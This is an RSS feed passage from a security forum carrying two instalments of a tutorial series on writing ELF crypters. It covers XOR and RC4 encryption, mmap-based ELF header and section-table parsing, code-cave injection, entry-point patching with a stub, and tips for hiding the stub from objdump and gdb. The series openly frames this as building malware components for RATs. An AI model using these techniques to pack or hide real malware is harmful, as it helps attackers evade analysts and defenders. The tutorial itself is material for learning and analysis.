<p>In order to make this technique work, we need to do two changes to the crypter. The first one is temporal during this testing phase. As we want to keep our shellcode as simple as possible, what we are going to do is to add the write permissions to the <code>text</code> segment while we look for the code cave.</p>
<p>In the final version, the stub will do and undo that as part of its operations, but for now, to check that we are patching correctly everything, let’s proceed this way:</p>
<p>So, what we need to do is a small change in the loop through the <em>Program Header Table</em>.</p>
<pre><code class="lang-auto">  for (i = 0; i &lt; elf_hdr-&gt;e_phnum; i++) {
    if (ph[i].p_type == PT_LOAD) {
      printf ("PHR %d  flags: %d (offset:%ld size:%ld)\n",
	      i, ph[i].p_flags, ph[i].p_offset, ph[i].p_filesz);
      if (ccave) ccave_size = ph[i].p_offset - ccave;
	  
      if (ph[i].p_flags &amp; PF_X) {
	     ph[i].p_flags |= PF_W; // ***** Add write permissions  *****
	     ccave = ph[i].p_offset + ph[i].p_filesz;
      }
    }
  }
</code></pre>
<p>Yes, that easy. Whenever we found the initial address of the code cave we just add write permissions to that segment. Otherwise, when we try to restore the original <code>_start</code> opcodes from our stub we will get a segmentation fault.</p>
<p>Next, we need to store the original instructions at the original entry point of the binary we want to crypt.</p>
<pre><code class="lang-auto">  // Store 8 bytes at current entry point
  unsigned char op[8], *ep =  p + elf_hdr-&gt;e_entry;
  for (i = 0; i &lt; 8; op[i++]= ep[i]);
</code></pre>
<p>And now we can inject the call instruction:</p>
<pre><code class="lang-auto">  Elf64_Addr oep = elf_hdr-&gt;e_entry;
  //
  ep[0] = 0xe8;                          // CALL
  *((int*)&amp;ep[1]) = ccave- oep - 5;      // Offset to sub
</code></pre>
<p>Finally we just need to patch the value we load in <code>RDX</code> in our stub. If we dump our stub code with <code>objdump</code>:</p>
<pre><code>$ objdump -d stub5.o

stub5.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;_start2&gt;:
   0:   57                      push   %rdi
   1:   56                      push   %rsi
   2:   52                      push   %rdx
   3:   50                      push   %rax
   4:   b8 01 00 00 00          mov    $0x1,%eax
   9:   bf 01 00 00 00          mov    $0x1,%edi
   e:   48 8d 35 24 00 00 00    lea    0x24(%rip),%rsi        # 39 &lt;msg&gt;
  15:   ba 0d 00 00 00          mov    $0xd,%edx
  1a:   0f 05                   syscall
  1c:   48 83 6c 24 20 05       subq   $0x5,0x20(%rsp)
  22:   48 8b 44 24 20          mov    0x20(%rsp),%rax

0000000000000027 &lt;patch1&gt;:
  27:   48 ba 88 77 66 55 44    movabs $0x1122334455667788,%rdx
  2e:   33 22 11
  31:   48 89 10                mov    %rdx,(%rax)
  34:   58                      pop    %rax
  35:   5a                      pop    %rdx
  36:   5e                      pop    %rsi
  37:   5f                      pop    %rdi
  38:   c3                      retq

0000000000000039 &lt;msg&gt;:
</code></pre>
<p>We can see that the instruction is at offset <code>0x27</code> and the values for the <code>mov</code> start 2 bytes later:</p>
<pre><code class="lang-auto">  // Copy codes into shellcode 
  ep = p + ccave + 0x27 + 2;
  for (i =0; i &lt; 8; ep[i] = op[i], i++);
</code></pre>
<p><em>Note: That we can copy the original entry point opcodes directly into the stub code… I just did it in two steps so it is easier to follow.</em></p>
<p>And we are done. Now you can try this last injection technique.</p>
<p>The advantage of this techniques, when compared to the other two is that the entry point is not modified. In other words, having an entry point that points to the very end of the text segment is suspicious… just because compilers put the entry point at the beginning of the segment.</p>
<p>Conceptually all three techniques are the same… first jump to the stub, do your thing, come back to the original code. You can come up with other ways of achieving this, it all depends on the specific problem you have to solve.</p>
<h1>
<a name="bonus-12" class="anchor" href="https://0x00sec.org#bonus-12"></a>Bonus</h1>
<p>Maybe you have already noticed this, specially if you have been following the text along, but if not… Once a binary is encrypted… can you dump the <code>stub</code> code?</p>
<p>The answer is of course: yes, you can. But the way of doing it is not straightforward. If you use <code>objdump</code> or <code>gdb</code> you cannot just disassemble the <code>stub</code>. The reason is that we haven’t updated the section and program header tables to let these tools know that our binary is now, actually, a bit longer than before. All sections and program header sizes have been kept the same, and that is what all these tools uses to find and show code… So, for the novice eye, our crypter is completely hidden.</p>
<p>This is a side effect of the way we injected the code, and it just works because the kernel ELF loader just copies all the data from the disk with page size granularity… and as far as there is room, everything is OK.</p>
<p>This is pretty cool right?, but it makes debugging a nightmare. You can deal with this in different ways. I will just point out two options.</p>
<p>The first, and easier, is to just patch the size fields of your sections and program headers so all tools will just work fine with your crypted binary. Just set it up in a way that, when you are done debugging, you can just remove those lines from the final release, and make your <code>stub</code> invisible again to the inexperienced eye.</p>
<p>The other way, and this is maybe more suitable for a malware analyst trying to do a dynamical analysis, is to use <code>gdb</code>.</p>
<p>When loading one of our <em>crypted</em>  binaries on <code>gdb</code> we cannot see the code either. We need to start executing the program to be able to see the <code>stub</code>. For our last injection code we can just add a break point in the entry point and jump into the <code>call</code>, that will make the <code>stub</code> visible.</p>
<p>For the first injection cases we cannot do that, because the entry point is not accessible, and we cannot figure out the final address because of the PIE thingy (actually gdb will load the binary allways in the same address so you just need to do this once, if you do not know by heart the base address it uses). Then what you can do is set a breakpoint at ‘*0’. This will start the execution of the program but will stop before running any instruction. This way we can see the memory address where the program was loaded, and now we can add a break point in the address where our stub is located and start debugging it.</p>
<p>Yes, this kind of things (crypters, exploits,…) are annoying to debug…</p>
<h1>
<a name="conclusions-13" class="anchor" href="https://0x00sec.org#conclusions-13"></a>Conclusions</h1>
<p>In this instalment we have explored different ways to inject code in a binary and make sure that we then execute the original program. We are almost done with our crypter, we just need to finish it. Actually we have already learnt a lot about virus in the way… but let’s get back to those later.</p>
<p>In the next instalment we will convert our <code>rc4</code> algorithm to assembler and complete the <code>stub</code> to perform all the tasks it is suppose to do, and effectivelly finish a pretty complete crypter.</p>
            <p><small>15 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wannabes-xiv-crypters-part-ii/27696">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wannabes-xiv-crypters-part-ii/27696</link>
          <pubDate>Sat, 27 Nov 2021 14:09:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-27696</guid>
          <source url="https://0x00sec.org/t/programming-for-wannabes-xiv-crypters-part-ii/27696.rss">Programming for Wannabes XIV. Crypters Part II</source>
        </item>
        <item>
          <title>Programming for Wanabes XIII. Crypters part I</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>This is the first instalment to dive you deep into the awesome world of crypters. You will learn everything about these little guys which are a usual component of different types of malware, including the RATs that we are discussing right now.</p>
<p>Technically, crypters, in their traditional form, are closer related to virus, than to any other malware, in the sense that they require in deep knowledge of the binary format of the target system (ELF, PE,…), but this looks like a good time to start digging into them and add some spice to our RATs.</p>
<h1>
<a name="whats-a-crypter-1" class="anchor" href="https://0x00sec.org#whats-a-crypter-1"></a>What’s a crypter?</h1>
<p>Strictly speaking, a crypter is a program able to encrypt a binary (another program) and modify it so it will decrypt itself at run-time. In practice, the part of the modified program that actually decrypts the code at run-time is also often known as crypter. I prefer to refer to this last one as <em>stub</em> or <em>crypter stub</em>, but you will see some people naming it just crypter.</p>
<p>The crypter, usually encrypts the code of the program, that is, the executable sections and optionally, the read-only section where stuff like literal strings ends up (so <code>strings</code> will show nothing).</p>
<p>I will mostly talk about binary crypters, however, the concept as defined in previous paragraphs, can also be applied to scripting languages or bytecode-based platforms (like Java or .NET CLR). However, in these cases the term obfuscator is often used (and I would say more correct), specially for the scripting language, as many times, the code is not really crypted but just made hard to read.</p>
<p>For scripting language the whole thing ends up orbiting around the specific <code>eval</code> function provided by your language of choice. Most scripting language have such a function (<code>eval</code> is usually the name) that just executes a text string.</p>
<p>For bytecode related platforms, the crypter may have to make use of the so-called reflection API provided by the platform. This is in general pretty straightforward from a technical point of view, and fully documented in the official documentation of the platform, but if you want to get this things covered, let me know in the comments.</p>
<p>Both cases are (in the general case) simpler than crypting a binary, so we will focus on that case… the hard one :).</p>
<p>Overall, I will try to deal with the concept in a general way, so you will learn the basics in a way such as you should be able to tailor what you have learned in this instalment (and the next ones) to your specific needs.</p>
<h1>
<a name="how-does-a-crypter-works-2" class="anchor" href="https://0x00sec.org#how-does-a-crypter-works-2"></a>How does a crypter works?</h1>
<p>A crypter actually works like a virus. It crypts selected parts of the binary and then it injects some code and makes sure it gets executed before anything else in that binary. The last part very much resembles what a virus does… doesn’t it?</p>
<p>So, the crypter program behaves a bit like a virus whose payload crypts the binary. For doing that, the crypter has to:</p>
<ul>
<li>Find the parts of the binary to encrypt (usually <code>.text</code> and <code>.rodata</code> sections)</li>
<li>Crypt them</li>
<li>Inject the <code>stub</code> in the binary</li>
<li>Patch the <code>stub</code> and the binary header to ensure the <code>stub</code> is properly executed at run time.</li>
</ul>
<p>Note that the <code>stub</code> gets executed once the program has been fully loaded, so all code is already in memory. We will go into all the gory details a bit later, but for now, let’s look at the big picture.</p>
<blockquote>
<p><em>You may crypt shared libraries that you manage yourself. That is actually an exception to the previous sentence, but it is somehow a subset of what we are going to discuss here.</em></p>
</blockquote>
<p>That is what the crypter does.</p>
<p>The crypter’s <code>stub</code> has to do some other things:</p>
<ul>
<li>Change the memory permissions so it can write into those blocks. This is done using the <code>mprotect</code> system call. We will usually crypt the <code>.text</code> and <code>.rodata</code> sections that do not have write permission when loaded by the system.</li>
<li>If the selected algorithm cannot be applied directly in that memory area (because, for instance, it works on data blocks/chunks), it may need to allocate memory to copy the data to decrypt or at least some buffer to work with.</li>
<li>Then it can decrypt the block of memory</li>
<li>And finally give control to the Original Entry Point (aka <code>OEP</code>), that is, literally the original entry point before running the crypter on our binary… So, yes, we need to store it somewhere.</li>
</ul>
<p>Even when technically it is not necessary, malware will likely set the permision back to its original configuration, so there is nothing strange about that program, once it has been decrypted and is running normally.</p>
<p>Let’s get started getting our cipher ready.</p>
<h1>
<a name="cryptography-101-3" class="anchor" href="https://0x00sec.org#cryptography-101-3"></a>Cryptography 101</h1>
<p>Yes, I said we will dive deep into the topic, so we need to know a little bit about cryptography, or in other words, how to crypt and decrypt sequences of bytes.</p>
<p>Cryptography is used on different security aspects:  authentication, privacy, data integrity, non-repudiation. In the case of a crypter the relevant aspect is privacy. In other words, avoiding non-authorised people to peek into our code. At least not easily.</p>
<p>There are different cryptography algorithms to transform a sequence of bits in another sequence of bits different of the original one, but in a way that we can recover the original sequence, using some private data (known as key). That’s mostly it about pivacy… pretty easy right?.</p>
<p>You can think on different alternatives to achieve that goal. For instance, just adding a value to each byte, will completely transform the sequence and we can easily recover the original message just substracting that same value. This is actually one of the simplest ciphers ever and it is know as <a href="https://en.wikipedia.org/wiki/Caesar_cipher" rel="noopener nofollow ugc">Caesar’s Cipher</a>.</p>
<p>Mathematically speaking, cryptography algorithms use what is known as <a href="https://en.wikipedia.org/wiki/Trapdoor_function" rel="noopener nofollow ugc">trapdoor functions</a>. Those are functions that are very easy to evaluate in one direction but very difficult to calculate its inverse, unless you have some extra information. That information is known as <em>trapdoor</em> or <em>key</em>.  At least, this is the basis for the more advanced cryptography algorithms.</p>
<p>Look at our Caesar’s cipher… encrypting the message is very easy. We just add a number to each byte. Recovering the original message is also easy if we know the <em>trapdoor</em>, in this case the number we added to each byte of the original message. But if we do not know that, we have to go brute-force and try all the 255 possibilities… And now, it should be obvious to you why this is a weak cipher :).</p>
<blockquote>
<p><em>The Caesar cipher, doesn’t really fit into the mathematical concept of trapdoor function, but it is good enough to illustrate the concept. In real world we will be talking about more complex things like the <a href="https://en.wikipedia.org/wiki/Euler%27s_totient_function" rel="noopener nofollow ugc">Euler’s totient function</a>.</em></p>
</blockquote>
<p>That is the key of cryptography. Overall, all codes can be broken, the trick is that breaking them will take that long that it makes no sense to even try… we are talking about millions of years here. Actually this is also the key to obfuscation… anything can be reversed, the point is that the effort to do that reversing doesn’t pay off or won’t be done according to some time frame constraint.</p>
<p>Keep this in mind, because these time is not engraved on stone. Some cryptography algorithms where considered very safe years ago, when the computers had a very limited power. For those computers breaking those old algorithms will take hundred or thousands of years, but that same algorithm may be broken in days or hours with new hardware… In other words, what is extremely safe right now, may be weak in a few years.</p>
<p>And this is enough for now, we do not need to talk about symmetric and asymmetric encryption (but I have just introduced the terms for the more curious of you), that will come up naturally when we talk about ransomware in the future :).</p>
<p>To finish with this quick introduction to cryptography, let’s quickly talk about the family of algorithms we are going to use.</p>
<h1>
<a name="xor-encoding-4" class="anchor" href="https://0x00sec.org#xor-encoding-4"></a>Xor Encoding</h1>
<p>Right now you may be thinking : <em>This guy must be kidding?..That xor thingy is pretty basic.</em>… You will be surprised my friend. I’ll show you… you just need to keep reading.</p>
<p>Xor encoding is very straightforward, and indeed has its drawbacks, but implemented carefully is a pretty decent cipher.</p>
<p>I’m sure you already know how it works, but just in case here is a quick description:</p>
<pre><code>For each byte in the plain text
  encrypted_value = plain_value ^ Key_Value
</code></pre>
<p>Where <code>^</code> is the C operator for <code>xor</code>. We can extend this for a key longer than 1 byte. Let’s switch to C code:</p>
<pre><code class="lang-auto">char key[KEY_LEN];
char msg[MSG_LEN];
int  i, j;         // Indexes for msg and key respectively

for (i = 0, j = 0; i &lt; MSG_LEN; msg[i++] ^= key[j++], j%=KEY_LEN) ;
</code></pre>
<p>We have used the comma <code>,</code> operator above to make the code shorter. It just executes the statements in order and returns the result of the last one. Together with <code>for</code> (that is just syntactic sugar for <code>while</code>) our code gets more compact (not necessarily shorter). In case you got a bit confused, the <code>for</code> loop above is equivalent to:</p>
<pre><code class="lang-auto">i = 0;
j = 0;
do {
  msg[i] = msg[i] ^ key[j];
  i++;
  j++;
  j = j % KEY_LEN;
} whle (i &lt; MSG_LEN);
</code></pre>
<p>Right?. The module operator in j is just to reset the key every time we exhaust the key values, so we can crypt messages longer than the key, just repeating the key over and over.</p>
<p>Now, if we make <code>KEY_LEN = MSG_LEN</code> we get a pretty hardcore cipher known as <a href="https://en.wikipedia.org/wiki/One-time_pad" rel="noopener nofollow ugc">one-time pad</a> or <em>Vernam Cipher</em>. This cipher is actually impossible to break if the following four rules are met (this is taken literally from the wikipedia article referenced above):</p>
<ol>
<li>The key must be random (uniformly distributed and independent of the plaintext), and sampled from a non-algorithmic, chaotic source such as a Hardware random number generator.</li>
<li>The key must be at least as long as the plaintext.</li>
<li>The key must never be reused in whole or in part.</li>
<li>The key must be kept completely secret by the communicating parties.</li>
</ol>
<p>So… yes, Xor encrypting is pretty basic, but with the code we have wrote so far we can already implement a few algorithms… basic xor cipher, Vernam Cipher and… RC4</p>
<h1>
<a name="rc4-initialisation-5" class="anchor" href="https://0x00sec.org#rc4-initialisation-5"></a>RC4. Initialisation</h1>
<p>RC4 is a cryptography algorithm designed by Ron Rivest. He is the <code>R</code> on <code>RSA</code>, and according to some people also the <code>R</code> on <code>RC4</code> <em>Rivest Cipher 4</em> but for other is an acronym of <em>Ron’s Code 4</em>, anyway, if you like more the last name or the first name, it doesn’t make a difference :). This cipher is still very simple, so we can implement it easily in asm (yeessss… we will do that), but it is also a real algorithm used in real life, so… not more trivial <code>memfrob</code>s in our code.</p>
<p>RC4 is just a xor encoder that uses a permutation matrix, initialised using the key, to generate a sequence of values to actually xor encode the message… It can be seen as a Vernam algorithm where a pseudo-random number sequence, generated from the given user key, is used as the encryption key (with size equal to the plain text) for the message.</p>
<p><em>Note that generating the sequence this way actually breaks rule one to make this code unbreakable…</em></p>
<p>A permutation matrix is a common concept in many ciphers and usually is represented by the letter <code>S</code> (you will see that if you check other ciphers). Basically, it is a matrix that allows us to change the order of a given set. If you ever tried to program a card game, you will have come through this concept to shuffle the cards in the deck…</p>
<p>The first part of the algorithm is known as <em>Key-Scheduling Algorithm</em> or KSA.</p>
<blockquote>
<p><em>An algorithm here is just a sequence of mathematical operations we have to do in a certain order to achieve some goal. In this case encrypting a message.</em></p>
</blockquote>
<p>This algorithm just shuffles the permutation matrix based on the user provided key. The permutation matrix (vector actually) is initialised to identity.  Identity is just mathematical jargon for saying <strong>ONE</strong> for <em>Maths things</em> that involve many numbers like a matrix or a vector, in this case it just set all elements of the vector such as `S[i] = i’. As a permutation matrix, this means that a set going through that matrix will not change (will return the 255 elements in order 1 returns 1, 2 retursm 2, and so on)… which is what happens when we multiply a number by 1. Enough about algebra. I promise.</p>
<p>Then, the permutation matrix is shuffled 255 times. The whole KSA can be implemented with the C code below:</p>
<pre><code class="lang-auto">  for (i = 0; i &lt; 255; S[i] = i,i++);
  for (j = 0, i = 0; i &lt; 256; i++) {
    j = (j + S[i] + key[i % klen] ) % 256;
    SWAP(S[i],S[j]);
  }
</code></pre>
<p>Where <code>SWAP</code> is a macro that swaps the values of the two variables passed as parameters.</p>
<p>There are different ways to swap two values. In this case, I chose the addition/substraction technique that doesn’t requires an intermediate variable:</p>
<pre><code class="lang-auto">#define SWAP(a,b) a += b; b= a -b; a-=b;
</code></pre>
<p>After this step, our permutation matrix <code>S</code> is in a state that depends on the selected key. Now is time to crypt our data.</p>
<h2>
<a name="modulo-operator-6" class="anchor" href="https://0x00sec.org#modulo-operator-6"></a>Modulo Operator</h2>
<p>In case you are not familiar with the modulo operator, here is a short introduction as we will be using it all over the place. The modulo operator calculates the remainder of the integer division of its two parameters. Let’s name <code>N</code> the number we want to divide (dividend) and <code>D</code> the number we are dividing by (the divisor). Let’s name <code>C</code> the result of the integer division and let’s name <code>R</code> the remainder of the operation.</p>
<p>As you may remember from school: <code>N / D = C + R</code></p>
<p>The modulo operator just return the value <code>R</code>. It is normally used to bound the range of values of a given number. Let’ see an example:</p>
<pre><code>0 % 5 = 0   (0/5 = 0)
1 % 5 = 1   (1/5 = 0 + 1)
2 % 5 = 2   (2/5 = 0 + 2)
3 % 5 = 3
4 % 5 = 4
5 % 5 = 0   (5/5 = 1 + 0)
6 % 5 = 1   (6/5 = 1 + 1)
</code></pre>
<p>As you can see if we calculate <code>% 5</code> of any number we are just keeping that number between <code>0</code> and <code>4</code>. So, <code>% 256</code> keeps that number between <code>0</code> and <code>255</code> which is actually a byte. Later on, we will see how to take advantage of this fact… actually the algorithm was designed on-purpose to work on bytes. Thanks Mr Rivest!</p>
<blockquote>
<p><em>Many cryptography algorithms are designed to work on bit streams… which are convenient for hardware implementation but may be a bit tricky to implement on SW</em>.</p>
</blockquote>
<p>As a final note, implementing the modulo operation is not straight forward, however there are simplified versions when we divide by powers of two… We will come to this later.</p>
<h1>
<a name="rc4-crypting-7" class="anchor" href="https://0x00sec.org#rc4-crypting-7"></a>RC4. Crypting</h1>
<p>The crypting process is also very simple, it basically uses the permutation matrix to generate a pseudo-random sequence of values, which will be <code>XOR</code>ed with the plain text. Seen like that, it is a <em>Vernam Cipher</em> where the key is generated automatically instead of randomly selected… This actually breaks the first rule to make <em>Vernam Cipher</em> impossible to break (have I alread said that?)… so RC4 can be broken.</p>
<p>The RC4 Pseudo-Random Generator together with the basic xor cipher uses the following code:</p>
<pre><code class="lang-auto">  i = j = 0;
  int cnt = 0;
  while (cnt &lt; MSG_LEN) {
    i = (i + 1) % 256;
    j = (j + S[i]) % 256;
    
    SWAP(S[i],S[j]);
    
    msg1[cnt++] = msg[cnt] ^ S[ (S[i] + S[j]) % 256];
  }
</code></pre>
<p>Where <code>msg</code> is the plain text and <code>msg1</code> is the buffer that will contain the result crypted message. Actually for RC4 we can decrypt in the same buffer that contains the plain text. In the code above, the value <code>S[(S[i] + S[j]) % 256]</code> is the so-called pseudo-random sequence generated by the RC4 pseudo-random generator. I have just compacted both operations (the pseudo-random number generation and the xor cipher) in one line.</p>
<h2>
<a name="pseudo-random-numbers-8" class="anchor" href="https://0x00sec.org#pseudo-random-numbers-8"></a>Pseudo-Random Numbers?</h2>
<p>We talk about pseudo-random number generation because the numbers generated this way, are not really random… actually there is a correlation between them because, they are generated through an operation on previous values. Knowing the so-called <em>Seed</em> of the generator (in this case this is actually knowing the key) is possible to regenerate the whole sequence… Something that doesn’t happen with a real random sequence (that is what independent means statistically speaking).</p>
<p>Modern OSes uses <a href="https://en.wikipedia.org/wiki/Hardware_random_number_generator#Using_observed_events" rel="noopener nofollow ugc">entropy pools</a> to produce better random sequences (from an statistical point of view), specially when compared to the old <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator" rel="noopener nofollow ugc">linear congruential generators</a> used in the early stages (old TCP spoofing was exploiting that). For doing that, they measure different things like keyboard or mouse activity, disk accesses, etc… and uses those values to produce random sequences. It is very easy to produce pseudo-random numbers but very difficult to produce real random ones. YOu can look for the difference between <code>/dev/random</code> and <code>/dev/urandom</code> to learn more about this topic… ever wonder by <code>ssh</code> ask you to press keys and move the mouse when generating your keys?..</p>
<p>RC4 is a real world algorithm. It is used by the WEP authentication algorithm for wifi networks, or by the Microsoft Point-to-Point Encryption and was used to encrypt PDF until version 2.0 of that file format. It is not that popular neither powerful nowadays, but it is still a real world example, and you can still see it on the wild.</p>
<h1>
<a name="an-rc4-crypter-9" class="anchor" href="https://0x00sec.org#an-rc4-crypter-9"></a>An RC4 crypter</h1>
<p>Now that we have selected our cipher, it is time to write the crypter. Let’s start writing some general pseudo-code and work it out from there:</p>
<pre><code> Open and map binary
 Find the file parts to crypt
 Crypt it
 Insert stub
 Patch Entry-Point
</code></pre>
<p>So this is pretty straightforward, however each of these steps will require some explanation, so we will go through this list one by one and I will try to explain all the details about each step.</p>
<p><em>Note:Many of the things that come now have already been described in other articles from me, but I will re-write them here just for completeness. If you have already read those, there is not much new for you in the next sections.</em></p>
<h2>
<a name="open-and-map-binary-10" class="anchor" href="https://0x00sec.org#open-and-map-binary-10"></a>Open and Map Binary</h2>
<p>The first thing we need is to be able to access the content of the binary, the actual file, because we need to modify it. We can open the file, allocate memory in the heap, load the data, modify it and finally wrote it back into the file, or we can open the file and <em>memory map</em> it. The advantage of <code>mmap</code>ing the file is that, in one shot, we read the file in memory and any change in memory will just be automatically written back to the file when we close it.</p>
<p>In order to map the file we need its size, that we can obtain using the <code>fstab</code> system call. You should known it from previous instalments.</p>
<pre><code class="lang-auto">#define DIE(s) {perror(s);exit(1);}

int main (int argc, char *argv[]) {
  
  if (argc != 2) {
    fprintf (stderr, "Invalid number of parameters\n");
    fprintf (stderr, "Usage: crypter binary\n");
    exit (-1);
  }
  // Open file
  int fd;
  if ((fd = open (argv[1], O_RDWR, 0)) &lt; 0) DIE ("open");
  // get size
  struct stat _st;
  if (fstat (fd, &amp;_st) &lt; 0) DIE ("fstat");
  // Map file
  unsigned char *p;
  if ((p = mmap (0, _st.st_size, PROT_READ | PROT_WRITE,
		 MAP_SHARED, fd, 0)) == MAP_FAILED) DIE ("mmap");
</code></pre>
<p>All this code should be very straightforward to you. We are actually just executing three system calls in a row. <code>open</code> and <code>fstat</code> we have already used many times. <code>mmap</code> is new so let’s explain what it does.</p>
<p><code>mmap</code> does a map into virtual memory. What does it maps?, well, usually it either maps physical memory, and then <code>mmap</code> is used to allocate memory, or it maps a file, and then <code>mmap</code> can be used to access the file as it is where stored in memory (this can also be used as shared memory between processes). In general, <code>mmap</code> may be supported by any block device driver… they just need to implement the functionality in the associated driver, what not always makes sense.</p>
<p>Let’s go through all the parameters (double check the man page for further details):</p>
<ul>
<li>First parameter is the memory address we want to map the memory into. When we pass 0, we just tell <code>mmap</code> to chose a suitable address for us. In our case, we do not care about the address where our file is mapped. This address needs to be page aligned… in case you want to specify one.</li>
<li>Second parameter is obviously the size of the block. Note that, even when you can provide any number for this parameter, <code>mmap</code> will map memory in multiples of the page size… that means that, unless our file has a size multiple of the page size, the last page will be just partially used.</li>
<li>Third parameter are permissions. In this case we want to be able to read and to write…</li>
<li>Forth parameter are flags. Check the man page for a exhaustive list. In our case we just use the flag <code>MAP_SHARED</code> that means, that our changes in the memory will be written back to the file when we are done.</li>
<li>Fifth parameter is a file descriptor for the device we want to map. In this case it is just a file so we pass the file descriptor we obtained from <code>open</code>
</li>
<li>Sixth parameter allows us to specify an offset in the device to start the mapping., In this case we want to map the whole file. Actually, most of the information we need is at the very beginning of it, in the ELF header.</li>
</ul>
<p>So far so good.</p>
<h2>
<a name="find-the-code-11" class="anchor" href="https://0x00sec.org#find-the-code-11"></a>Find the code</h2>
<p>Now we need to find the part of the program that we need to crypt. For doing this, we need to dive into the details of the ELF format. For a detailed description I recommend you to check <a href="https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267">this</a> and also the <a href="http://refspecs.linuxbase.org/elf/elf.pdf" rel="noopener nofollow ugc">ELF spec</a>… that eventually will become your best friend :).</p>
<p>The spec is quite extensive, but for our current discussion we just need to focus in two structures: The ELF header and the Section Table.</p>
<p>The ELF header is found at the very beginning of the file and contains the information needed to get us to the Section Table that give us infomation about what part of the file is code, what is data, and so on.</p>
<p>Let’s first look at the header</p>
<pre><code class="lang-auto">typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	    e_phoff;		/* Program header table file offset */
  Elf64_Off	    e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;	/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;	/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */ 
} Elf64_Ehdr;
</code></pre>
<p>This is taken from <code>/usr/include/elf.h</code> and it is the header for 64bits ELFs (I won’t deal with 32bits in this series… you can do that yourself as an exercise).</p>
<p>The first fields can be used for some sanity check that we are going to skip (just to keep this short), so the fields that we are interested on are actually the ones below:</p>
<pre><code class="lang-auto">  Elf64_Off	    e_shoff;		/* Program header table file offset */
  Elf64_Half	e_shentsize;	/* Program header table entry size */
  Elf64_Half	e_shnum;		/* Program header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */   
</code></pre>
<p>With this new information we can add some technical output to our crypter, that will make it look cooler:</p>
<pre><code class="lang-auto">  // Find code segment
  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr*) p;
  // Sanity checks oimitted
  printf ("Section Table located at : %ld\n", elf_hdr-&gt;e_shoff);
  printf ("Section Table entry size : %ld\n", elf_hdr-&gt;e_shentsize);
  printf ("Section Table entries    : %ld\n", elf_hdr-&gt;e_shnum);
</code></pre>
<p>Remember that <code>p</code>, is the pointer returned by <code>mmap</code> and also remember that the ELF header is just at the beginning of the file, so if we just cast <code>p</code> into and <code>Elf64_Ehdr</code> pointer we can read the data at <code>p</code> using that structure. Now we just need to go through the <em>Section Table</em> and find the sections we are interested on.</p>
<blockquote>
<p><strong>Short digression on casting</strong><br>
Casting a variable in programming means forcing the type of that variable. As you already now, it doesn’t matter what type you assign to your variable in your program, it ends up as a series of bytes in memory. How are those bytes interpreted by a programming language depends on the type (which is something programming language dependant). But we can force the language to interpret the bytes at some memory position in a different way… That is what a cast operator in C actually does.</p>
<p>Imagine that, at position <code>ADDR</code> in memory we find the values: 0x41, 0x42, 0x43, 0x00. If we cast a pointer to that address to be a <code>char</code> pointer, we will see the string <code>ABC</code>, but if we cast it to be a <code>int</code> type, we will see the value 0x00434241 (for a little endian processor), but if we cast it to a pointer to <code>u16_t</code> we will read 0x4241 and if we read the next value we will read 0x0043… The values in memory are always the same, but depending how do we interpret them in our programming language some things may be easier or harder to do.</p>
<p>Remember… types are just an illusion \ö/</p>
</blockquote>
<p>With this information we can now traverse the <em>Section Table</em> with a couple of lines:</p>
<pre><code class="lang-auto">  int i;
  Elf64_Shdr *sh = (Elf64_Shdr*)(p + elf_hdr-&gt;e_shoff) ;
  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++) {
   (... do your thing ...)
  }
</code></pre>
<p>The piece of code above shows the wonders of pointers that only C offers…</p>
<h2>
<a name="processing-the-section-table-12" class="anchor" href="https://0x00sec.org#processing-the-section-table-12"></a>Processing the Section Table</h2>
<p>We will have to discuss this a bit more in detail later, but for the time being, we will rely on the section table to find the relevant parts of the binary to encrypt. When crypting our own programs, that is not an issue as we can generate the program normally, including all the normal sections, and strip it out later. However, this won’t work on an heavily stripped binary.</p>
<p>If we use the utility <code>sstrip</code> on the binary, one of the things it does is to wipe out the section table… which is actually not needed to run the program, and therefore our code to look for specific sections won’t work. In that case, it is not that straightforward to figure out which part of the binary is code and which not… But we will come back to this later… Let’s continue with the nominal case.</p>
<p><em>Note, if you check a few binaries in your system you will see that most of them (if not all) contains their section table. You can use <code>readelf -S</code> for checking that, or keep reading and use your own tool :).</em></p>
<p>Before, unveiling what we need to do in the loop, let’s take a quick look to the Section Table entry structure. We can get it, again, from <code>/usr/include/elf.h</code>:</p>
<pre><code class="lang-auto">typedef struct
{
  Elf64_Word    sh_name;                /* Section name (string tbl index) */
  Elf64_Word    sh_type;                /* Section type */
  Elf64_Xword   sh_flags;               /* Section flags */
  Elf64_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf64_Off     sh_offset;              /* Section file offset */
  Elf64_Xword   sh_size;                /* Section size in bytes */
  Elf64_Word    sh_link;                /* Link to another section */
  Elf64_Word    sh_info;                /* Additional section information */
  Elf64_Xword   sh_addralign;           /* Section alignment */
  Elf64_Xword   sh_entsize;             /* Entry size if section holds table */
} Elf64_Shdr;

</code></pre>
<p>Once again, we are only interested in a few fields for our task at hand:</p>
<ul>
<li>
<code>sh_name</code>. This field will allow us to get the section name. We will see in a second how to get those names</li>
<li>
<code>sh_offset</code> which tell us where in the file is the data associatd to this section. In other words, the offset on the file to the data we have to crypt.</li>
<li>
